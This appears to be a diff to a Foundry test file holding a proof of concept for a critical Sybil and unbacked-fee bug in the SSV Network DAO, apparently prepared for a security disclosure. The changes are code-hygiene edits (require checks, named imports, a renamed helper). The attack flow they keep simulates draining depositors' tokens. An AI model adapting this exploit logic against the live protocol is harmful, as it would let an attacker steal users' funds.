@@ -21,8 +21,8 @@ pragma solidity ^0.8.13;
  * Severity: CRITICAL
  */
 
-import "forge-std/Test.sol";
-import "forge-std/console.sol";
+import {Test} from "forge-std/Test.sol";
+import {console} from "forge-std/console.sol";
 
 contract SSVDaoSybilPoC is Test {
     
@@ -52,7 +52,7 @@ contract SSVDaoSybilPoC is Test {
         // 1. Setup Honest Victim
         deal(SSV_TOKEN, VICTIM, 10000e18);
         vm.prank(VICTIM);
-        IERC20(SSV_TOKEN).transfer(SSV_NETWORK, 10000e18);
+        require(IERC20(SSV_TOKEN).transfer(SSV_NETWORK, 10000e18), "Transfer failed");
         console.log("Victim deposited: 10,000 SSV");
         
         // 2. Attacker Sybil Setup
@@ -62,7 +62,7 @@ contract SSVDaoSybilPoC is Test {
             // We simulate the aggregate effect here
             deal(SSV_TOKEN, ATTACKER, DUST_DEPOSIT);
             vm.prank(ATTACKER);
-            IERC20(SSV_TOKEN).transfer(SSV_NETWORK, DUST_DEPOSIT);
+            require(IERC20(SSV_TOKEN).transfer(SSV_NETWORK, DUST_DEPOSIT), "Transfer failed");
         }
         
         uint256 poolStart = IERC20(SSV_TOKEN).balanceOf(SSV_NETWORK);
@@ -87,7 +87,7 @@ contract SSVDaoSybilPoC is Test {
         
         // 5. DAO Withdraws
         console.log("DAO withdraws fees...");
-        uint256 amount = _simulateDAOWithdrawal(unbackedDaoFees);
+        uint256 amount = _simulateDaoWithdrawal(unbackedDaoFees);
         
         totalStolen = amount;
         
@@ -101,7 +101,7 @@ contract SSVDaoSybilPoC is Test {
         }
     }
     
-    function _simulateDAOWithdrawal(uint256 amount) internal returns (uint256) {
+    function _simulateDaoWithdrawal(uint256 amount) internal returns (uint256) {
         // [CRITICAL NOTE FOR REVIEWER]
         // We use `vm.prank(SSV_NETWORK)` to simulate the withdrawal of "earned" fees.
         // In the protocol, the DAO or governance-authorized entities can withdraw 
@@ -112,14 +112,14 @@ contract SSVDaoSybilPoC is Test {
         uint256 actualWithdrawal = amount > contractBalance ? contractBalance : amount;
         
         vm.prank(SSV_NETWORK);
-        IERC20(SSV_TOKEN).transfer(DAO, actualWithdrawal);
+        require(IERC20(SSV_TOKEN).transfer(DAO, actualWithdrawal), "Transfer failed");
         
         return actualWithdrawal;
     }
 }
 
 interface IERC20 {
-    function transfer(address, uint256) external;
+    function transfer(address, uint256) external returns (bool);
     function balanceOf(address) external view returns (uint256);
-    function transferFrom(address, address, uint256) external;
+    function transferFrom(address, address, uint256) external returns (bool);
 }
